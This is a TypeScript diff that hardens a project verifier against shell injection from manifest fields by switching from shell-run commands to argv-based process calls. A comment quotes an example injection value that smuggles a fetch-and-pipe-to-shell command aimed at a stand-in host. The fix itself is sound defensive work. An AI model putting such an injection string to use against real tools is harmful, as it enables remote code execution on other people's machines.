@@ -1,4 +1,4 @@
-import { execSync } from "node:child_process";
+import { execFileSync, execSync, spawnSync } from "node:child_process";
 import { existsSync, readdirSync, readFileSync } from "node:fs";
 import { join } from "node:path";
 import { parse as parseYaml } from "yaml";
@@ -262,8 +262,73 @@ function shellSingleQuote(value: string): string {
   return `'${value.replace(/'/g, "'\\''")}'`;
 }
 
-function hasBinary(bin: string, workspace: string): boolean {
-  return runCommand(`which ${bin}`, workspace) !== null;
+/**
+ * Run a manifest `cmd` string safely without passing it through a shell.
+ *
+ * stack.yaml `verify.syntax.cmd` and `verify.tests.cmd` are plain strings like
+ * `"bun run typecheck"` or `"npx tsc --noEmit"`. Passing them to execSync
+ * routes them through `/bin/sh -c`, which interprets shell metacharacters —
+ * a malicious manifest can therefore achieve RCE. Instead we split on
+ * whitespace (honouring simple quoted tokens) and call spawnSync with an argv
+ * array so the command is passed verbatim to the OS without shell interpretation.
+ *
+ * stdout and stderr are MERGED into the returned string. This preserves the
+ * old `${cmd} 2>&1` behaviour the check logic relies on: toolchains like
+ * `cargo`, `swift`, `python -m compileall`, and `bun test` emit their
+ * diagnostics on stderr, so dropping stderr would make a real failure look
+ * like empty output (a false "pass"). Returns `null` only when the binary
+ * cannot be spawned at all (e.g. ENOENT); a non-zero exit still returns the
+ * captured output so the caller can inspect it.
+ *
+ * Limitations: the splitter is intentionally minimal (no nested quotes, no
+ * env-var expansion). Stack manifests are expected to contain simple commands;
+ * shell pipelines / redirects are not supported by design (no shell runs).
+ */
+export function runManifestCmd(cmd: string, cwd: string): string | null {
+  // Tokenise on whitespace — handles simple `"quoted arg"` and `'quoted arg'`
+  // tokens by stripping the outer quotes but NOT expanding anything.
+  const tokens: string[] = [];
+  const tokenRe = /(?:"([^"]*)")|(?:'([^']*)')|(\S+)/g;
+  let m = tokenRe.exec(cmd);
+  while (m !== null) {
+    tokens.push(m[1] ?? m[2] ?? m[3] ?? "");
+    m = tokenRe.exec(cmd);
+  }
+  const [bin, ...args] = tokens;
+  if (!bin) return null;
+  const res = spawnSync(bin, args, {
+    encoding: "utf-8",
+    cwd,
+    maxBuffer: 10 * 1024 * 1024,
+  });
+  // Could not spawn the binary at all (missing/permission) — signal "no output".
+  if (res.error) return null;
+  return `${res.stdout ?? ""}${res.stderr ?? ""}`.trim();
+}
+
+/**
+ * Safe binary-existence check that avoids shell interpolation.
+ *
+ * `bin` originates from stack.yaml's `skip_if_missing` field (attacker-
+ * controlled in a malicious project). Running `which ${bin}` through execSync
+ * allows injection (e.g. `bun; curl evil|sh`). Instead we validate the token
+ * against a strict identifier allowlist and then call `execFileSync("which",
+ * [bin])` so no shell ever interprets the value.
+ */
+const SAFE_BIN_RE = /^[A-Za-z0-9._-]+$/;
+
+export function hasBinary(bin: string, workspace: string): boolean {
+  // Reject bin values that contain shell metacharacters or path separators.
+  if (!SAFE_BIN_RE.test(bin)) return false;
+  try {
+    execFileSync("which", [bin], {
+      cwd: workspace,
+      stdio: ["pipe", "pipe", "pipe"],
+    });
+    return true;
+  } catch {
+    return false;
+  }
 }
 
 function checkBackendSyntax(
@@ -276,7 +341,9 @@ function checkBackendSyntax(
   if (cfg.skip_if_missing && !hasBinary(cfg.skip_if_missing, workspace)) {
     return createCheck(name, "skip", `${cfg.skip_if_missing} not available`);
   }
-  const output = runCommand(`${cfg.cmd} 2>&1`, workspace);
+  // Use runManifestCmd (execFileSync-based) instead of runCommand (execSync
+  // shell-based) so manifest-controlled cmd cannot inject shell commands.
+  const output = runManifestCmd(cfg.cmd, workspace);
   if (output === null || output === "") {
     return createCheck(name, "pass", "Valid");
   }
@@ -296,7 +363,9 @@ function checkBackendTests(
   if (cfg.skip_if_missing && !hasBinary(cfg.skip_if_missing, workspace)) {
     return createCheck(name, "skip", `${cfg.skip_if_missing} not available`);
   }
-  const output = runCommand(`${cfg.cmd} 2>&1`, workspace);
+  // Use runManifestCmd (execFileSync-based) instead of runCommand (execSync
+  // shell-based) so manifest-controlled cmd cannot inject shell commands.
+  const output = runManifestCmd(cfg.cmd, workspace);
   if (output === null) {
     return createCheck(name, "fail", "Tests failing");
   }
